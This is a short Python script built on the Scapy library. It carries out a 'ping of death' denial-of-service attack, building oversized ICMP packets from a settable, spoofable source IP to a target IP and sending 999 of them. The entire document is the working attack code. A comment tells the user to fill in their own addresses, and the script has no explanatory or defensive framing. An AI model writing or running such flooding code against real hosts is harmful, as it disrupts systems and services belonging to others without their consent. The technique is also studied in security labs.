from scapy.all import *

# Change according with your IP addresses
SOURCE_IP="192.168.0.2"
TARGET_IP="192.168.0.15"
MESSAGE="T"
NUMBER_PACKETS=999 # Number of pings

pingOFDeath = IP(src=SOURCE_IP, dst=TARGET_IP)/ICMP()/(MESSAGE*60000)
send(NUMBER_PACKETS*pingOFDeath)